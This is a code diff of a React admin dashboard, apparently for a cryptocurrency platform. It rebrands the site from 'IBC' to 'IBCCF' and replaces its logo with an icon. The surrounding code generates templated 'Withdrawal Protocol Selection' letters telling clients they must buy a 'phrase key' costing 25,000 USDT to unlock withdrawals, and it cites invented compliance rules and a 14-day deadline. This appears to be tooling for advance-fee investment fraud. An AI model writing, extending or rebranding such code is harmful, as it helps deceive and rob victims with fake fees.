@@ -20,7 +20,6 @@ import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, Folder
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Switch } from "@/components/ui/switch";
 import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, PieChart, Pie, Cell, LineChart, Line, Legend } from "recharts";
-import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
 import { motion, AnimatePresence } from "framer-motion";
 import { useTheme } from "@/App";
@@ -1655,7 +1654,7 @@ export default function AdminDashboard() {
           setLetterData({
             headline: "Withdrawal Protocol Selection",
             introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
-            bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
+            bodyContent: "In accordance with IBCCF cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
             footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
             complianceReference: `CCR-${Date.now().toString(36).toUpperCase()}`,
             optionATitle: "Accelerated Release",
@@ -1673,7 +1672,7 @@ export default function AdminDashboard() {
             optionBKeyCost: "25,000 USDT",
             optionBTotalRequirement: "25,000 USDT",
             phraseKeyRequirements: "A phrase key is a cryptographic security measure that must be purchased to unlock and authorize each withdrawal transaction.",
-            complianceNotice: "Important: All withdrawal protocols are subject to IBC compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
+            complianceNotice: "Important: All withdrawal protocols are subject to IBCCF compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
           });
         }
       }
@@ -1696,7 +1695,7 @@ export default function AdminDashboard() {
           setLetterData({
             headline: "Withdrawal Protocol Selection",
             introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
-            bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
+            bodyContent: "In accordance with IBCCF cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
             footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
             complianceReference: `CCR-${Date.now().toString(36).toUpperCase()}`,
             optionATitle: "Accelerated Release",
@@ -1714,7 +1713,7 @@ export default function AdminDashboard() {
             optionBKeyCost: "25,000 USDT",
             optionBTotalRequirement: "25,000 USDT",
             phraseKeyRequirements: "A phrase key is a cryptographic security measure that must be purchased to unlock and authorize each withdrawal transaction.",
-            complianceNotice: "Important: All withdrawal protocols are subject to IBC compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
+            complianceNotice: "Important: All withdrawal protocols are subject to IBCCF compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
           });
         }
       }
@@ -1831,7 +1830,9 @@ export default function AdminDashboard() {
       <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
         <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
           <div className="text-center mb-8">
-            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" data-testid="img-admin-logo" />
+            <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-[#004182]/20 flex items-center justify-center" data-testid="img-admin-logo">
+              <ShieldCheck className="h-10 w-10 text-[#004182]" />
+            </div>
             <h1 className="text-xl font-bold text-white tracking-wider">ADMIN CONTROL PANEL</h1>
             <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">ISO-D Compliance Management</p>
           </div>
@@ -1897,9 +1898,11 @@ export default function AdminDashboard() {
     <div className="min-h-screen bg-slate-900 text-slate-100 font-sans">
       <header className="bg-slate-950 border-b border-slate-800 px-6 py-4 flex justify-between items-center">
         <div className="flex items-center gap-3">
-           <img src={ibcLogo} alt="Logo" className="h-8 w-8 opacity-80 grayscale" data-testid="img-logo" />
+           <div className="w-8 h-8 rounded-lg bg-[#004182]/20 flex items-center justify-center" data-testid="img-logo">
+             <ShieldCheck className="h-5 w-5 text-[#004182]" />
+           </div>
            <div>
-             <h1 className="font-bold text-lg tracking-tight text-white">IBC GLOBAL MONITORING</h1>
+             <h1 className="font-bold text-lg tracking-tight text-white">IBCCF ADMIN PORTAL</h1>
              <div className="flex items-center gap-2 text-[10px] uppercase tracking-wider text-slate-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                System Active • ISO-D Clearance Level 1
